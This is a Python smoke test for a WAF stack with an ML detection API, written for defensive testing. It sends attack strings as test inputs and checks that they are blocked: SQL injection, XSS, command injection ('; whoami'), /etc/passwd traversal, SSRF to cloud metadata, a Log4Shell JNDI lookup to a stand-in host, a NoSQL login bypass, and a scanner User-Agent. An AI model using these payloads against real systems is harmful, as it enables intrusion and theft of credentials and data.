"""End-to-end smoke test of the running stack: client -> OpenResty WAF -> ML API -> backend.

Run after `docker compose up -d openresty` (CI does this with a model trained
on synthetic data):

    python tests/smoke.py --url http://localhost:8080 --compose-logs

Checks that benign traffic reaches the backend, that a signature hit and an
ML-only attack are both blocked, that the other attack categories (XSS,
command injection, traversal, SSRF, Log4Shell, ...) are blocked, that security
headers and the login rate limit apply, that the admin page works, and (with
--compose-logs) that the access log credits each block to the right engine
and category. Standard library only.
"""

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

REGEX_ATTACK = "1 UNION SELECT username, password FROM users"
# No WAF signature matches this, so only the model can block it.
ML_ATTACK = "7 AND UNICODE(SUBSTRING(username,1,1))>100"
BACKEND_TEXT = "backend_app reached"


def request(url: str, method: str = "GET", body: dict | None = None,
            headers: dict | None = None) -> tuple[int, str]:
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.status, response.read().decode()
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode()


def get(base: str, value: str) -> tuple[int, str]:
    return request(f"{base}/search?{urllib.parse.urlencode({'q': value})}")


def wait_until(description: str, check, timeout_s: float) -> None:
    deadline = time.monotonic() + timeout_s
    while True:
        try:
            if check():
                return
        except OSError:
            pass  # not listening yet
        if time.monotonic() > deadline:
            raise SystemExit(f"FAIL: timed out waiting for {description}")
        time.sleep(1)


def response_headers(url: str) -> dict[str, str]:
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            return {k.lower(): v for k, v in response.headers.items()}
    except urllib.error.HTTPError as error:
        return {k.lower(): v for k, v in error.headers.items()}


def log_entries_by_request_id() -> dict[str, dict]:
    logs = subprocess.run(["docker", "compose", "logs", "--no-log-prefix", "openresty"],
                          capture_output=True, text=True, check=True).stdout
    entries = {}
    for line in logs.splitlines():
        if line.startswith("{"):
            entry = json.loads(line)
            entries[entry["request_id"]] = entry
    return entries


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--admin-url", default="http://127.0.0.1:8081")
    parser.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the stack")
    parser.add_argument("--compose-logs", action="store_true", help="Also check engines in `docker compose logs`")
    args = parser.parse_args()
    base = args.url.rstrip("/")

    wait_until("the WAF", lambda: request(f"{base}/waf/healthz")[0] == 200, args.timeout)
    # This test sends many attacks from one IP: start from a clean ban counter
    # (a ban left by an earlier run would turn every check into a 403).
    admin = args.admin_url.rstrip("/")
    my_ip = json.loads(request(f"{admin}/api/bans")[1])["your_ip"]
    request(f"{admin}/api/bans", "POST", {"ip": my_ip, "action": "unban"})
    # The WAF fails open while the model loads, so wait until the ML path blocks.
    wait_until("the ML-only attack to be blocked (model still loading, or the WAF is not blocking)",
               lambda: get(base, ML_ATTACK)[0] == 403, args.timeout)

    failures = []

    def expect(name: str, result: tuple[int, str], status: int, backend: bool = True) -> dict:
        code, body = result
        ok = code == status and (status != 200 or not backend or BACKEND_TEXT in body)
        print(f"{'ok  ' if ok else 'FAIL'} {name}: HTTP {code}")
        if not ok:
            failures.append(name)
        try:
            return json.loads(body) if code == 403 else {}
        except ValueError:
            return {}

    expect("benign query string reaches the backend", get(base, "red shoes"), 200)
    expect("benign JSON body reaches the backend", request(f"{base}/api", "POST", {"name": "O'Brien"}), 200)
    regex_block = expect("signature attack is blocked", get(base, REGEX_ATTACK), 403)
    ml_block = expect("ML-only attack is blocked", get(base, ML_ATTACK), 403)
    expect("attack in a JSON body is blocked", request(f"{base}/api", "POST", {"id": REGEX_ATTACK}), 403)

    # Beyond SQLi: one attack per category, each expected in the access log
    # under that category (checked below with --compose-logs).
    category_blocks = {
        "xss": expect("XSS is blocked", get(base, "<img src=x onerror=alert(1)>"), 403),
        "cmdi": expect("command injection is blocked", get(base, "127.0.0.1; whoami"), 403),
        "lfi": expect("path traversal in a parameter is blocked", get(base, "../../../../etc/passwd"), 403),
        "ssrf": expect("SSRF to cloud metadata is blocked", get(base, "http://169.254.169.254/latest/meta-data/"), 403),
        "rce": expect("Log4Shell in the User-Agent is blocked",
                      request(f"{base}/", headers={"User-Agent": "${jndi:ldap://evil.test/a}"}), 403),
        "ssti": expect("template injection is blocked", get(base, "{{7*7}}"), 403),
        "nosqli": expect("NoSQL operator in a JSON key is blocked",
                         request(f"{base}/login-check", "POST", {"username": "admin", "password": {"$ne": None}}), 403),
        "scanner": expect("a scanner User-Agent is blocked",
                          request(f"{base}/", headers={"User-Agent": "sqlmap/1.8.2#stable"}), 403),
    }
    expect("probe for /.env is blocked", request(f"{base}/.env"), 403)
    # nginx itself refuses an encoded traversal out of the root (400) before the WAF runs.
    code, _ = request(f"{base}/static/..%2f..%2f..%2fetc%2fpasswd")
    print(f"{'ok  ' if code in (400, 403) else 'FAIL'} path traversal in the path is refused: HTTP {code}")
    if code not in (400, 403):
        failures.append("path traversal in the path")
    expect("benign HTML formatting reaches the backend", get(base, "<b>bold</b> and <i>italic</i>"), 200)
    expect("benign relative URL reaches the backend", get(base, "https://cdn.example.com/a/../c.js"), 200)

    headers = response_headers(f"{base}/search?q=shoes")
    ok = headers.get("x-content-type-options") == "nosniff" and "x-frame-options" in headers \
        and "x-powered-by" not in headers
    print(f"{'ok  ' if ok else 'FAIL'} security headers added to backend responses")
    if not ok:
        failures.append("security headers")

    login_codes = [request(f"{base}/api/login", "POST", {"user": "a", "password": str(i)})[0] for i in range(12)]
    ok = 429 in login_codes and login_codes[0] == 200
    print(f"{'ok  ' if ok else 'FAIL'} login brute force is rate limited ({login_codes})")
    if not ok:
        failures.append("login rate limit")

    # Admin page: switching the protected site. Restores whatever was set before.
    before = json.loads(request(f"{admin}/api/target")[1])
    expect("admin page is served", request(f"{admin}/"), 200, backend=False)
    expect("admin rejects a non-http address", request(f"{admin}/api/target", "POST", {"url": "ftp://x.test"}), 400)
    expect("admin refuses to expose the ML API", request(f"{admin}/api/target", "POST", {"url": "http://ml-api:8000"}), 400)
    expect("admin rejects a cross-site request",
           request(f"{admin}/api/target", "POST", {"url": "http://backend_app:8080"},
                   headers={"Origin": "https://evil.test"}), 403)
    expect("admin rejects a foreign Host (DNS rebinding)",
           request(f"{admin}/api/target", headers={"Host": "evil.test"}), 403)
    code, body = request(f"{admin}/api/target", "POST", {"url": "http://backend_app:8080/some/page"})
    switched = json.loads(body) if code == 200 else {}
    expect("admin switches the target", (code, body), 200, backend=False)
    ok = switched.get("url") == "http://backend_app:8080" and switched.get("source") == "admin"
    print(f"{'ok  ' if ok else 'FAIL'} admin normalizes the address (got {switched.get('url')!r})")
    if not ok:
        failures.append("admin normalize")
    expect("benign traffic reaches the new target", get(base, "blue shoes"), 200)
    code, body = request(f"{admin}/api/test", "POST", {})
    test = json.loads(body) if code == 200 else {}
    ok = test.get("attack", {}).get("status") == 403 and test.get("benign", {}).get("status") == 200
    print(f"{'ok  ' if ok else 'FAIL'} admin self-test: attack blocked, normal request let through ({test})")
    if not ok:
        failures.append("admin self-test")
    # Security dashboard: page, live data, runtime rule switch, dry-run console.
    dash_headers = response_headers(f"{admin}/dashboard")
    ok = "script-src 'self'" in dash_headers.get("content-security-policy", "")
    print(f"{'ok  ' if ok else 'FAIL'} dashboard is served with a no-inline-script CSP")
    if not ok:
        failures.append("dashboard CSP")
    code, body = request(f"{admin}/api/overview")
    overview = json.loads(body) if code == 200 else {}
    ok = code == 200 and overview.get("requests", 0) > 0 and len(overview.get("hours", [])) == 24
    print(f"{'ok  ' if ok else 'FAIL'} dashboard overview counts logged traffic ({overview.get('requests')} requests)")
    if not ok:
        failures.append("dashboard overview")
    code, body = request(f"{admin}/api/feed?limit=50")
    events = json.loads(body).get("events", []) if code == 200 else []
    ok = any(e.get("category") == "xss" and e.get("payload") for e in events)
    print(f"{'ok  ' if ok else 'FAIL'} dashboard feed lists the XSS block with its payload")
    if not ok:
        failures.append("dashboard feed")
    scanner_ua = {"User-Agent": "sqlmap/1.8.2#stable"}
    request(f"{admin}/api/rules", "POST", {"id": "scanner", "enabled": False})
    off_code = request(f"{base}/search?q=x", headers=scanner_ua)[0]
    request(f"{admin}/api/rules", "POST", {"id": "scanner", "enabled": True})
    on_code = request(f"{base}/search?q=x", headers=scanner_ua)[0]
    ok = off_code == 200 and on_code == 403
    print(f"{'ok  ' if ok else 'FAIL'} switching a rule off and on applies at once (off: {off_code}, on: {on_code})")
    if not ok:
        failures.append("dashboard rule switch")
    verdicts = {}
    for value in ("<img src=x onerror=alert(1)>", "O'Brien"):
        code, body = request(f"{admin}/api/evaluate", "POST", {"payload": value})
        verdicts[value] = json.loads(body).get("verdict") if code == 200 else code
    ok = verdicts == {"<img src=x onerror=alert(1)>": "block", "O'Brien": "allow"}
    print(f"{'ok  ' if ok else 'FAIL'} dashboard test console dry run ({verdicts})")
    if not ok:
        failures.append("dashboard evaluate")

    # Automatic IP ban: THRESHOLD blocked requests ban this client; a harmless
    # request is then refused without inspection; unbanning lets it through.
    settings = json.loads(request(f"{admin}/api/bans")[1])["settings"]
    if settings["enabled"]:
        request(f"{admin}/api/bans", "POST", {"ip": my_ip, "action": "unban"})
        attack_codes = {get(base, REGEX_ATTACK)[0] for _ in range(settings["threshold"])}
        banned_code, banned_body = get(base, "red shoes")
        bans = json.loads(request(f"{admin}/api/bans")[1])["bans"]
        ok = attack_codes == {403} and banned_code == 403 and any(b["ip"] == my_ip and b["by"] == "auto" for b in bans)
        print(f"{'ok  ' if ok else 'FAIL'} {settings['threshold']} blocked requests ban the client "
              f"(benign request after: HTTP {banned_code})")
        if not ok:
            failures.append("auto ban")
        banned_id = json.loads(banned_body).get("request_id") if banned_code == 403 else None
        request(f"{admin}/api/bans", "POST", {"ip": my_ip, "action": "unban"})
        expect("unbanning lets the client through again", get(base, "red shoes"), 200)
        if args.compose_logs and banned_id:
            time.sleep(1)
            got = log_entries_by_request_id().get(banned_id, {}).get("waf_action")
            ok = got == "banned"
            print(f"{'ok  ' if ok else 'FAIL'} access log records the refused request as 'banned' (got {got!r})")
            if not ok:
                failures.append("ban log")
    code, _ = request(f"{admin}/api/bans", "POST", {"ip": "127.0.0.1", "action": "ban"})
    print(f"{'ok  ' if code == 409 else 'FAIL'} loopback can't be banned (HTTP {code})")
    if code != 409:
        failures.append("ban allowlist")

    if before.get("source") == "admin":
        request(f"{admin}/api/target", "POST", {"url": before["url"], "force": True})
    else:
        expect("admin resets to .env", request(f"{admin}/api/reset", "POST", {}), 200, backend=False)

    if args.compose_logs:
        time.sleep(1)  # let the access log flush
        entries = log_entries_by_request_id()
        for name, block, engine in (("regex", regex_block, "regex"), ("ml", ml_block, "ml")):
            got = entries.get(block.get("request_id", ""), {}).get("waf_engine")
            ok = got == engine
            print(f"{'ok  ' if ok else 'FAIL'} access log credits the {name} block to engine {engine!r} (got {got!r})")
            if not ok:
                failures.append(f"engine {name}")
        for category, block in [("sqli", regex_block), ("sqli", ml_block), *category_blocks.items()]:
            got = entries.get(block.get("request_id", ""), {}).get("waf_category")
            ok = got == category
            print(f"{'ok  ' if ok else 'FAIL'} access log records category {category!r} (got {got!r})")
            if not ok:
                failures.append(f"category {category}")

    if failures:
        print(f"\n{len(failures)} check(s) failed")
        return 1
    print("\nAll smoke checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
